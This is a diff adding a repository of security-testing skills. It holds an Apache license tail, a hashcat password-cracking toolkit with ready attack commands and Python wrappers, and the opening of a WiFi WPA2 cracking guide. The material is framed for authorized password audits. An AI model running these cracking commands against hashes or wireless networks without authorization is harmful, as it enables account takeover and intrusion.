@@ -1,0 +1,1219 @@
+[PART 12/14]
+-----
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/assets/template.md #####
+# Hash Cracking Assessment Template
+
+## Authorization Verification
+
+- [ ] Written authorization obtained from asset owner
+- [ ] Scope of engagement defines which hashes may be cracked
+- [ ] Data handling requirements documented
+- [ ] Results reporting chain defined
+- [ ] Data destruction timeline agreed
+
+## Hashcat Quick Reference
+
+```bash
+# Identify hash type
+hashcat --identify hash.txt
+
+# MD5 dictionary
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# NTLM with rules
+hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# bcrypt dictionary (slow)
+hashcat -m 3200 -a 0 hashes.txt wordlist.txt
+
+# Benchmark
+hashcat -b
+```
+
+## Mask Charsets
+
+| Charset | Characters | Symbol |
+|---------|-----------|--------|
+| ?l | a-z | lowercase |
+| ?u | A-Z | uppercase |
+| ?d | 0-9 | digits |
+| ?s | special chars | symbols |
+| ?a | ?l?u?d?s | all printable |
+
+## Reporting Template
+
+| Metric | Value |
+|--------|-------|
+| Total hashes | [count] |
+| Cracked | [count] ([%]) |
+| < 1 minute | [count] (CRITICAL) |
+| < 1 hour | [count] (HIGH) |
+| < 1 day | [count] (MEDIUM) |
+| Not cracked | [count] (OK) |
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/references/api-reference.md #####
+# API Reference — Performing Hash Cracking with Hashcat
+
+## Libraries Used
+- **subprocess**: Execute hashcat with various attack modes
+- **hashlib**: Generate test hashes (MD5, SHA1, SHA256, SHA512)
+- **re**: Pattern matching for hash type identification
+- **pathlib**: Read hash files and potfiles
+
+## CLI Interface
+```
+python agent.py identify --hash <hash_string>
+python agent.py identify --file hashes.txt
+python agent.py crack --hash-file hashes.txt --mode 0 --attack dictionary --wordlist rockyou.txt [--rules best64.rule]
+python agent.py crack --hash-file hashes.txt --mode 1000 --attack brute --mask "?u?l?l?l?d?d?d?s"
+python agent.py parse --potfile hashcat.potfile
+python agent.py gen --text "password123" --algo sha256
+```
+
+## Core Functions
+
+### `identify_hash(hash_string)` — Detect hash type and hashcat mode
+Matches against 12 patterns: MD5 (0), SHA1 (100), SHA256 (1400), SHA512 (1700),
+NTLM (1000), bcrypt (3200), sha512crypt (1800), md5crypt (500), NetNTLMv2 (5600),
+Kerberos TGS (13100), Kerberos AS-REP (18200).
+
+### `run_hashcat(hash_file, mode, attack, wordlist, rules, mask)` — Execute hashcat
+Attack modes: `dictionary` (-a 0), `brute` (-a 3), `combinator` (-a 1).
+
+### `parse_hashcat_status(potfile)` — Analyze cracked passwords
+Returns length distribution, charset analysis, top passwords from potfile.
+
+### `generate_hash(plaintext, algorithm)` — Create test hashes
+Supported: md5, sha1, sha256, sha512.
+
+## Hashcat Mask Charsets
+- `?l` lowercase, `?u` uppercase, `?d` digits, `?s` special, `?a` all
+
+## Dependencies
+System: hashcat (GPU-accelerated hash cracking)
+No Python packages required — standard library only.
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/references/standards.md #####
+# Standards and References - Hash Cracking with Hashcat
+
+## Tools
+
+### Hashcat
+- **URL**: https://hashcat.net/hashcat/
+- **GitHub**: https://github.com/hashcat/hashcat
+- **Wiki**: https://hashcat.net/wiki/
+- **Hash modes**: https://hashcat.net/wiki/doku.php?id=hashcat
+
+### Wordlists
+- **SecLists**: https://github.com/danielmiessler/SecLists
+- **RockYou**: Classic breach wordlist (14 million passwords)
+- **CrackStation**: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
+
+## Standards
+
+### NIST SP 800-63B - Digital Identity Guidelines (Authentication)
+- **URL**: https://pages.nist.gov/800-63-3/sp800-63b.html
+- **Description**: Password requirements and memorized secret guidelines
+
+### OWASP Password Storage Cheat Sheet
+- **URL**: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
+
+## Legal Framework
+
+- Computer Fraud and Abuse Act (CFAA) - US
+- Computer Misuse Act 1990 - UK
+- Always obtain written authorization before testing
+- Follow penetration testing rules of engagement
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/references/workflows.md #####
+# Workflows - Hash Cracking with Hashcat
+
+## Workflow 1: Hash Identification and Cracking
+
+```
+[Captured Hashes]
+      |
+[Identify Hash Type]
+(hashcat --identify, hashid, haiti)
+      |
+[Select Attack Strategy]:
+  1. Dictionary attack (rockyou.txt)
+  2. Dictionary + rules (best64.rule)
+  3. Mask attack (brute-force)
+  4. Hybrid (wordlist + mask)
+      |
+[Execute Hashcat]
+      |
+[Analyze Results]
+(cracked count, time, patterns)
+      |
+[Generate Password Strength Report]
+```
+
+## Workflow 2: Hashcat Command Examples
+
+```bash
+# Dictionary attack
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+
+# Dictionary + rules
+hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule
+
+# Mask (brute-force 8-char lowercase)
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
+
+# Hybrid (wordlist + 4 digits)
+hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d
+
+# Show cracked passwords
+hashcat -m 0 hashes.txt --show
+```
+
+## Workflow 3: Password Audit Report
+
+```
+[Cracking Results]
+      |
+[Categorize]:
+  - Cracked in < 1 min: CRITICAL
+  - Cracked in < 1 hour: HIGH
+  - Cracked in < 1 day: MEDIUM
+  - Not cracked: Acceptable
+      |
+[Pattern Analysis]:
+  - Common base words
+  - Character set distribution
+  - Length distribution
+  - Policy compliance
+      |
+[Generate Report with Recommendations]
+```
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Agent for performing hash cracking with hashcat — hash identification, attack management, and result analysis."""
+
+import json
+import argparse
+import subprocess
+import hashlib
+import re
+from collections import Counter
+from pathlib import Path
+
+
+HASH_PATTERNS = {
+    "MD5": (r"^[a-f0-9]{32}$", 0),
+    "SHA1": (r"^[a-f0-9]{40}$", 100),
+    "SHA256": (r"^[a-f0-9]{64}$", 1400),
+    "SHA512": (r"^[a-f0-9]{128}$", 1700),
+    "NTLM": (r"^[a-f0-9]{32}$", 1000),
+    "bcrypt": (r"^\$2[aby]?\$\d+\$.{53}$", 3200),
+    "sha512crypt": (r"^\$6\$[^\$]+\$[a-zA-Z0-9./]{86}$", 1800),
+    "sha256crypt": (r"^\$5\$[^\$]+\$[a-zA-Z0-9./]{43}$", 7400),
+    "md5crypt": (r"^\$1\$[^\$]+\$[a-zA-Z0-9./]{22}$", 500),
+    "NetNTLMv2": (r"^[^:]+::\S+:[a-f0-9]{16}:[a-f0-9]{32}:[a-f0-9]+$", 5600),
+    "Kerberos_TGS": (r"^\$krb5tgs\$", 13100),
+    "Kerberos_AS": (r"^\$krb5asrep\$", 18200),
+}
+
+
+def identify_hash(hash_string):
+    """Identify hash type and return hashcat mode."""
+    candidates = []
+    for name, (pattern, mode) in HASH_PATTERNS.items():
+        if re.match(pattern, hash_string.strip(), re.IGNORECASE):
+            candidates.append({"type": name, "hashcat_mode": mode})
+    return {"hash": hash_string[:40] + "..." if len(hash_string) > 40 else hash_string, "candidates": candidates}
+
+
+def identify_hashes_file(hash_file):
+    """Identify hash types from a file of hashes."""
+    hashes = Path(hash_file).read_text(encoding="utf-8", errors="replace").strip().splitlines()
+    results = []
+    for h in hashes[:100]:
+        h = h.strip()
+        if h:
+            results.append(identify_hash(h))
+    types = {}
+    for r in results:
+        for c in r["candidates"]:
+            types[c["type"]] = types.get(c["type"], 0) + 1
+    return {"total_hashes": len(results), "type_distribution": types, "samples": results[:5]}
+
+
+def run_hashcat(hash_file, mode, attack="dictionary", wordlist=None, rules=None, mask=None):
+    """Execute hashcat with specified attack mode."""
+    cmd = ["hashcat", "-m", str(mode), "--quiet", "--potfile-disable", "-o", "/tmp/hashcat_out.txt"]
+    if attack == "dictionary":
+        if not wordlist:
+            return {"error": "wordlist required for dictionary attack"}
+        cmd += ["-a", "0", hash_file, wordlist]
+        if rules:
+            cmd += ["-r", rules]
+    elif attack == "brute":
+        m = mask or "?a?a?a?a?a?a?a?a"
+        cmd += ["-a", "3", hash_file, m]
+    elif attack == "combinator":
+        if not wordlist:
+            return {"error": "two wordlists required (comma-separated)"}
+        wl = wordlist.split(",")
+        if len(wl) != 2:
+            return {"error": "combinator needs two wordlists: list1.txt,list2.txt"}
+        cmd += ["-a", "1", hash_file, wl[0], wl[1]]
+    else:
+        return {"error": f"Unknown attack type: {attack}"}
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
+        cracked = []
+        out_file = Path("/tmp/hashcat_out.txt")
+        if out_file.exists():
+            for line in out_file.read_text().strip().splitlines():
+                parts = line.split(":", 1)
+                if len(parts) == 2:
+                    cracked.append({"hash": parts[0][:30] + "...", "plain": parts[1]})
+        return {
+            "attack": attack, "mode": mode, "cracked_count": len(cracked),
+            "cracked": cracked[:50], "return_code": result.returncode,
+            "stderr_snippet": result.stderr[:300] if result.stderr else "",
+        }
+    except FileNotFoundError:
+        return {"error": "hashcat not found in PATH"}
+    except subprocess.TimeoutExpired:
+        return {"error": "hashcat timed out after 3600s"}
+
+
+def parse_hashcat_status(potfile):
+    """Parse hashcat potfile for cracked results."""
+    cracked = []
+    try:
+        for line in Path(potfile).read_text(encoding="utf-8", errors="replace").strip().splitlines():
+            parts = line.split(":", 1)
+            if len(parts) == 2:
+                cracked.append({"hash": parts[0], "plain": parts[1]})
+    except FileNotFoundError:
+        return {"error": f"Potfile not found: {potfile}"}
+    passwords = [c["plain"] for c in cracked]
+    length_dist = {}
+    for p in passwords:
+        l = len(p)
+        bucket = f"{l}" if l <= 8 else "9-12" if l <= 12 else "13+"
+        length_dist[bucket] = length_dist.get(bucket, 0) + 1
+    charset = {"lowercase_only": 0, "uppercase_mixed": 0, "with_digits": 0, "with_special": 0}
+    for p in passwords:
+        if re.match(r"^[a-z]+$", p):
+            charset["lowercase_only"] += 1
+        elif re.search(r"\d", p):
+            charset["with_digits"] += 1
+        elif re.search(r"[!@#$%^&*()_+=\-\[\]{};:'\",.<>?/\\|`~]", p):
+            charset["with_special"] += 1
+        else:
+            charset["uppercase_mixed"] += 1
+    return {
+        "total_cracked": len(cracked),
+        "length_distribution": length_dist,
+        "charset_analysis": charset,
+        "top_passwords": [p for p, _ in Counter(passwords).most_common(10)],
+    }
+
+
+def generate_hash(plaintext, algorithm="sha256"):
+    """Generate hash of a plaintext string for testing."""
+    algos = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256, "sha512": hashlib.sha512}
+    if algorithm not in algos:
+        return {"error": f"Unsupported: {algorithm}. Use: {list(algos.keys())}"}
+    h = algos[algorithm](plaintext.encode()).hexdigest()
+    return {"plaintext": plaintext, "algorithm": algorithm, "hash": h}
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Hashcat Hash Cracking Agent")
+    sub = parser.add_subparsers(dest="command")
+    i = sub.add_parser("identify", help="Identify hash type")
+    i.add_argument("--hash", help="Single hash string")
+    i.add_argument("--file", help="File containing hashes")
+    c = sub.add_parser("crack", help="Run hashcat")
+    c.add_argument("--hash-file", required=True)
+    c.add_argument("--mode", type=int, required=True, help="Hashcat mode number")
+    c.add_argument("--attack", default="dictionary", choices=["dictionary", "brute", "combinator"])
+    c.add_argument("--wordlist", help="Wordlist path (or two comma-separated for combinator)")
+    c.add_argument("--rules", help="Hashcat rules file")
+    c.add_argument("--mask", help="Brute force mask")
+    p = sub.add_parser("parse", help="Parse potfile results")
+    p.add_argument("--potfile", required=True)
+    g = sub.add_parser("gen", help="Generate test hash")
+    g.add_argument("--text", required=True)
+    g.add_argument("--algo", default="sha256")
+    args = parser.parse_args()
+    if args.command == "identify":
+        result = identify_hashes_file(args.file) if args.file else identify_hash(args.hash) if args.hash else {"error": "provide --hash or --file"}
+    elif args.command == "crack":
+        result = run_hashcat(args.hash_file, args.mode, args.attack, args.wordlist, args.rules, args.mask)
+    elif args.command == "parse":
+        result = parse_hashcat_status(args.potfile)
+    elif args.command == "gen":
+        result = generate_hash(args.text, args.algo)
+    else:
+        parser.print_help()
+        return
+    print(json.dumps(result, indent=2, default=str))
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-hash-cracking-with-hashcat/scripts/process.py #####
+#!/usr/bin/env python3
+"""
+Hash Cracking Analysis and Hashcat Automation Tool
+
+Provides hash identification, hashcat command generation, result analysis,
+and password strength reporting for authorized security assessments.
+
+Requirements:
+    pip install passlib argon2-cffi
+
+Usage:
+    python process.py identify --hash "5f4dcc3b5aa765d61d8327deb882cf99"
+    python process.py generate-cmd --hash-file hashes.txt --mode 0 --attack dictionary
+    python process.py analyze-results --potfile hashcat.potfile --hash-file hashes.txt
+    python process.py create-test-hashes --output test_hashes.txt
+"""
+
+import os
+import re
+import sys
+import json
+import hashlib
+import argparse
+import logging
+from pathlib import Path
+from typing import Dict, List, Optional, Tuple
+from collections import Counter
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger(__name__)
+
+HASH_PATTERNS = {
+    r"^[a-f0-9]{32}$": [("MD5", 0), ("NTLM", 1000)],
+    r"^[a-f0-9]{40}$": [("SHA-1", 100)],
+    r"^[a-f0-9]{64}$": [("SHA-256", 1400)],
+    r"^[a-f0-9]{128}$": [("SHA-512", 1700)],
+    r"^\$2[aby]\$\d{2}\$.{53}$": [("bcrypt", 3200)],
+    r"^\$6\$": [("sha512crypt", 1800)],
+    r"^\$5\$": [("sha256crypt", 7400)],
+    r"^\$argon2(i|d|id)\$": [("Argon2", 32600)],
+    r"^\$1\$": [("md5crypt", 500)],
+    r"^\$apr1\$": [("Apache APR1", 1600)],
+    r"^[a-f0-9]{32}:[a-f0-9]+$": [("MD5 salted", 10)],
+    r"^\$krb5tgs\$": [("Kerberos TGS-REP", 13100)],
+    r"^[a-f0-9]{32}:[a-f0-9]{32}$": [("NetNTLMv1", 5500)],
+}
+
+
+def identify_hash(hash_value: str) -> List[Dict]:
+    """Identify the type of a hash value."""
+    hash_value = hash_value.strip()
+    matches = []
+
+    for pattern, hash_types in HASH_PATTERNS.items():
+        if re.match(pattern, hash_value, re.IGNORECASE):
+            for name, mode in hash_types:
+                matches.append({
+                    "hash_type": name,
+                    "hashcat_mode": mode,
+                    "confidence": "high" if len(hash_types) == 1 else "medium",
+                })
+
+    if not matches:
+        matches.append({
+            "hash_type": "Unknown",
+            "hashcat_mode": None,
+            "confidence": "none",
+        })
+
+    return matches
+
+
+def generate_hashcat_command(
+    hash_file: str,
+    mode: int,
+    attack: str = "dictionary",
+    wordlist: str = "rockyou.txt",
+    rules: Optional[str] = None,
+    mask: Optional[str] = None,
+    output_file: Optional[str] = None,
+) -> str:
+    """Generate a hashcat command string."""
+    cmd_parts = ["hashcat"]
+    cmd_parts.extend(["-m", str(mode)])
+
+    if attack == "dictionary":
+        cmd_parts.extend(["-a", "0"])
+        cmd_parts.append(hash_file)
+        cmd_parts.append(wordlist)
+        if rules:
+            cmd_parts.extend(["-r", rules])
+    elif attack == "bruteforce":
+        cmd_parts.extend(["-a", "3"])
+        cmd_parts.append(hash_file)
+        cmd_parts.append(mask or "?a?a?a?a?a?a?a?a")
+    elif attack == "hybrid_wm":
+        cmd_parts.extend(["-a", "6"])
+        cmd_parts.append(hash_file)
+        cmd_parts.append(wordlist)
+        cmd_parts.append(mask or "?d?d?d?d")
+    elif attack == "hybrid_mw":
+        cmd_parts.extend(["-a", "7"])
+        cmd_parts.append(hash_file)
+        cmd_parts.append(mask or "?d?d?d?d")
+        cmd_parts.append(wordlist)
+
+    if output_file:
+        cmd_parts.extend(["-o", output_file])
+
+    cmd_parts.extend(["--force", "--status", "--status-timer=10"])
+    return " ".join(cmd_parts)
+
+
+def create_test_hashes(output_path: str) -> Dict:
+    """Create a set of test password hashes for practice."""
+    test_passwords = [
+        "password", "123456", "admin", "letmein", "welcome",
+        "monkey", "dragon", "master", "qwerty", "login",
+        "P@ssw0rd", "Summer2024!", "company123", "test1234",
+        "hunter2", "trustno1", "batman", "shadow", "sunshine",
+        "iloveyou",
+    ]
+
+    hashes = {"md5": [], "sha1": [], "sha256": []}
+    for pwd in test_passwords:
+        pwd_bytes = pwd.encode("utf-8")
+        hashes["md5"].append(hashlib.md5(pwd_bytes).hexdigest())
+        hashes["sha1"].append(hashlib.sha1(pwd_bytes).hexdigest())
+        hashes["sha256"].append(hashlib.sha256(pwd_bytes).hexdigest())
+
+    output = Path(output_path)
+    for hash_type, hash_list in hashes.items():
+        path = output.parent / f"{output.stem}_{hash_type}{output.suffix}"
+        path.write_text("\n".join(hash_list) + "\n")
+        logger.info(f"Created {path} with {len(hash_list)} hashes")
+
+    return {
+        "test_passwords_count": len(test_passwords),
+        "hash_types": list(hashes.keys()),
+        "output_directory": str(output.parent),
+        "note": "These are intentionally weak passwords for authorized testing only",
+    }
+
+
+def analyze_cracked_results(potfile_path: str, hash_file_path: str) -> Dict:
+    """Analyze hashcat results from potfile."""
+    potfile = Path(potfile_path)
+    hash_file = Path(hash_file_path)
+
+    if not potfile.exists():
+        return {"error": f"Potfile not found: {potfile_path}"}
+
+    total_hashes = 0
+    if hash_file.exists():
+        total_hashes = sum(1 for line in hash_file.read_text().strip().split("\n") if line.strip())
+
+    cracked_passwords = []
+    for line in potfile.read_text().strip().split("\n"):
+        if ":" in line:
+            parts = line.rsplit(":", 1)
+            if len(parts) == 2:
+                cracked_passwords.append(parts[1])
+
+    cracked_count = len(cracked_passwords)
+    crack_rate = (cracked_count / total_hashes * 100) if total_hashes > 0 else 0
+
+    # Password analysis
+    lengths = [len(p) for p in cracked_passwords]
+    charset_analysis = {"lowercase_only": 0, "with_uppercase": 0, "with_digits": 0, "with_special": 0}
+
+    for pwd in cracked_passwords:
+        has_upper = any(c.isupper() for c in pwd)
+        has_digit = any(c.isdigit() for c in pwd)
+        has_special = any(not c.isalnum() for c in pwd)
+        if has_special:
+            charset_analysis["with_special"] += 1
+        elif has_digit and has_upper:
+            charset_analysis["with_digits"] += 1
+        elif has_upper:
+            charset_analysis["with_uppercase"] += 1
+        else:
+            charset_analysis["lowercase_only"] += 1
+
+    # Strength categories
+    strength = {"critical": 0, "weak": 0, "moderate": 0}
+    for pwd in cracked_passwords:
+        if len(pwd) < 8:
+            strength["critical"] += 1
+        elif len(pwd) < 12 or not any(not c.isalnum() for c in pwd):
+            strength["weak"] += 1
+        else:
+            strength["moderate"] += 1
+
+    common_words = Counter()
+    for pwd in cracked_passwords:
+        base = re.sub(r"[^a-zA-Z]", "", pwd).lower()
+        if len(base) >= 3:
+            common_words[base] += 1
+
+    return {
+        "total_hashes": total_hashes,
+        "cracked_count": cracked_count,
+        "crack_rate_percent": round(crack_rate, 1),
+        "uncracked_count": total_hashes - cracked_count,
+        "password_length": {
+            "min": min(lengths) if lengths else 0,
+            "max": max(lengths) if lengths else 0,
+            "avg": round(sum(lengths) / len(lengths), 1) if lengths else 0,
+        },
+        "charset_distribution": charset_analysis,
+        "strength_distribution": strength,
+        "top_base_words": dict(common_words.most_common(10)),
+        "recommendations": [
+            "Enforce minimum 12-character passwords",
+            "Require mixed character sets (upper, lower, digit, special)",
+            "Block common dictionary words and patterns",
+            "Implement password breach checking (Have I Been Pwned API)",
+            "Use Argon2id or bcrypt for password hashing (not MD5/SHA)",
+            "Consider passphrase-based policies over complexity rules",
+        ],
+    }
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Hash Cracking Analysis Tool")
+    subparsers = parser.add_subparsers(dest="command")
+
+    ident = subparsers.add_parser("identify", help="Identify hash type")
+    ident.add_argument("--hash", required=True, help="Hash value to identify")
+
+    gen = subparsers.add_parser("generate-cmd", help="Generate hashcat command")
+    gen.add_argument("--hash-file", required=True, help="Hash file path")
+    gen.add_argument("--mode", type=int, required=True, help="Hashcat hash mode")
+    gen.add_argument("--attack", choices=["dictionary", "bruteforce", "hybrid_wm", "hybrid_mw"], default="dictionary")
+    gen.add_argument("--wordlist", default="rockyou.txt")
+    gen.add_argument("--rules", help="Rules file")
+    gen.add_argument("--mask", help="Mask pattern")
+
+    create = subparsers.add_parser("create-test-hashes", help="Create test hashes")
+    create.add_argument("--output", "-o", default="test_hashes.txt")
+
+    analyze = subparsers.add_parser("analyze-results", help="Analyze cracking results")
+    analyze.add_argument("--potfile", required=True, help="Hashcat potfile")
+    analyze.add_argument("--hash-file", required=True, help="Original hash file")
+
+    args = parser.parse_args()
+
+    if args.command == "identify":
+        result = identify_hash(args.hash)
+        print(json.dumps(result, indent=2))
+    elif args.command == "generate-cmd":
+        cmd = generate_hashcat_command(args.hash_file, args.mode, args.attack, args.wordlist, args.rules, args.mask)
+        print(cmd)
+    elif args.command == "create-test-hashes":
+        result = create_test_hashes(args.output)
+        print(json.dumps(result, indent=2))
+    elif args.command == "analyze-results":
+        result = analyze_cracked_results(args.potfile, args.hash_file)
+        print(json.dumps(result, indent=2))
+    else:
+        parser.print_help()
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-wifi-password-cracking-with-aircrack/SKILL.md #####
+---
+name: performing-wifi-password-cracking-with-aircrack
+description: 'Captures WPA/WPA2 handshakes and performs offline password cracking
+  using aircrack-ng, hashcat, and dictionary attacks during authorized wireless security
+  assessments to evaluate passphrase strength and wireless network security posture.
+
+  '
+domain: cybersecurity
+subdomain: network-security
+tags:
+- network-security
+- wifi
+- aircrack-ng
+- wpa2
+- wireless-security
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- PR.IR-01
+- DE.CM-01
+- ID.AM-03
+- PR.DS-02
+mitre_attack:
+- T1046
+- T1040
+- T1557
+- T1071
+- T1591
+---
+# Performing WiFi Password Cracking with Aircrack-ng
+
+## When to Use
+
+- Assessing the strength of WPA/WPA2/WPA3 passphrases during authorized wireless penetration tests
+- Testing whether wireless networks are using weak or default passwords that can be cracked offline
+- Capturing and analyzing 4-way handshakes to evaluate wireless authentication security
+- Demonstrating the risks of WEP, weak WPA2 passphrases, and PMKID-based attacks to stakeholders
+- Validating that enterprise wireless networks use 802.1X/EAP instead of pre-shared keys
+
+**Do not use** against wireless networks without explicit written authorization, for disrupting wireless communications, or for capturing handshakes of networks you do not have permission to test.
+
+## Prerequisites
+
+- Written authorization specifying in-scope SSIDs and wireless networks
+- Wireless adapter with monitor mode and packet injection support (Alfa AWUS036ACH, Alfa AWUS036ACM, or similar)
